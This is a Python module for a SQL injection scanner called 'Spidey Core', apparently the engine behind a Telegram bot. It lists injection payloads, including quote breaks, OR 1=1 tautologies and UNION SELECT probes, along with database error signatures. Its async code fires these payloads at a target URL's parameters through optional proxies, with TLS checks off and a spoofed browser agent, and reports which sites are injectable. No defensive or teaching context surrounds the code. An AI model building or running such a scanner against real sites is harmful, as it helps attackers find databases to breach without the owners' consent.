"""
Spidey Core — SQLi Scanner
100% same as Telegram bot
"""
import asyncio
import aiohttp
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# ═══════════════════════════════════════════════════════════════════════════
#  PAYLOADS + ERRORS — 100% same
# ═══════════════════════════════════════════════════════════════════════════
SQLI_PAYLOADS = [
    "'", '"', "')", '")', "' OR '1'='1' --", '" OR "1"="1" --',
    "' OR 1=1 --", "') OR ('1'='1", "1' AND 1=2 --", "1 AND 1=2"
]

SQLI_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql",
    "unclosed quotation mark", "quoted string not properly terminated", "sqlstate",
    "ora-", "pg::syntaxerror", "sqlite3::exception", "sqlite_error",
    "microsoft ole db provider for sql server", "odbc sql server driver",
    "syntax error or access violation", "division by zero",
    "supplied argument is not a valid mysql", "mysql_fetch_array() expects parameter",
    "pdoexception:", "sqlstate[", "unterminated string literal",
    "syntax error at or near", "invalid input syntax"
]


# ═══════════════════════════════════════════════════════════════════════════
#  INJECT PAYLOAD — 100% same
# ═══════════════════════════════════════════════════════════════════════════
def _inject_payload(url, payload):
    """Inject payload into first param of URL"""
    try:
        p = urlparse(url)
        qs = parse_qs(p.query, keep_blank_values=True)
        new = {k: [v[0] + payload] for k, v in qs.items()}
        return urlunparse(p._replace(query=urlencode(new, doseq=True)))
    except Exception:
        return url + payload


# ═══════════════════════════════════════════════════════════════════════════
#  CHECK INJECTABLE — 100% same
# ═══════════════════════════════════════════════════════════════════════════
async def _check_injectable(session, url, proxy_url=""):
    """
    Check if URL is SQLi vulnerable.
    Tests: error-based + UNION-based detection.
    """
    kw = dict(
        timeout=aiohttp.ClientTimeout(total=3),
        ssl=False,
        allow_redirects=True,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    )
    if proxy_url:
        kw["proxy"] = proxy_url

    async def _probe(p):
        try:
            async with session.get(_inject_payload(url, p), **kw) as r:
                if r.status in (200, 500):
                    t = (await r.text(errors="ignore")).lower()
                    return any(e in t for e in SQLI_ERRORS)
        except Exception:
            pass
        return False

    # Error-based check
    res = await asyncio.gather(
        *[_probe(p) for p in SQLI_PAYLOADS],
        return_exceptions=True
    )
    if any(r is True for r in res):
        return True

    # UNION-based check
    MARK = "LBCHKX99"
    MARK_HEX = "0x" + MARK.encode().hex()
    for cols in (3, 4, 5, 2, 6, 7):
        for pos in range(min(cols, 4)):
            slots = ["NULL"] * cols
            slots[pos] = MARK_HEX
            try:
                payload = "' UNION SELECT " + ",".join(slots) + " -- -"
                async with session.get(_inject_payload(url, payload), **kw) as r:
                    if r.status in (200, 500):
                        if MARK in await r.text(errors="ignore"):
                            return True
            except Exception:
                pass
    return False